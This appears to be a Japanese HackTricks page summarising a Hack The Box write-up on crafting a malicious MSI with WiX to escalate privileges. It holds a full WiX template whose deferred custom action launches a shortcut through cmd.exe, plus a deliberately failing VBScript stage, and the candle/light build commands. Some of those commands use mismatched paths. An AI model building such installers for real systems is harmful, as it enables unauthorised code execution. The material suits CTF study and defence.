{{#include ../../banners/hacktricks-training.md}}

# 悪意のあるMSIの作成とルートの取得

MSIインストーラーの作成はwixtoolsを使用して行われ、特に[wixtools](http://wixtoolset.org)が利用されます。代替のMSIビルダーも試みられましたが、この特定のケースでは成功しませんでした。

wix MSIの使用例を包括的に理解するためには、[このページ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)を参照することをお勧めします。ここでは、wix MSIの使用を示すさまざまな例を見つけることができます。

目的は、lnkファイルを実行するMSIを生成することです。これを達成するために、以下のXMLコードを使用することができます（[xmlはこちらから](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)）：
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Package要素には、InstallerVersionやCompressedなどの属性が含まれており、インストーラーのバージョンを指定し、パッケージが圧縮されているかどうかを示します。

作成プロセスでは、wixtoolsのツールであるcandle.exeを利用して、msi.xmlからwixobjectを生成します。次のコマンドを実行する必要があります:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
さらに、投稿にはコマンドとその出力を示す画像が提供されていることに言及する価値があります。視覚的なガイダンスとして参照できます。

さらに、wixtoolsの別のツールであるlight.exeがwixobjectからMSIファイルを作成するために使用されます。実行されるコマンドは次のとおりです：
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
前のコマンドと同様に、コマンドとその出力を示す画像が投稿に含まれています。

この要約は貴重な情報を提供することを目的としていますが、より包括的な詳細と正確な指示については元の投稿を参照することをお勧めします。

## 参考文献

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
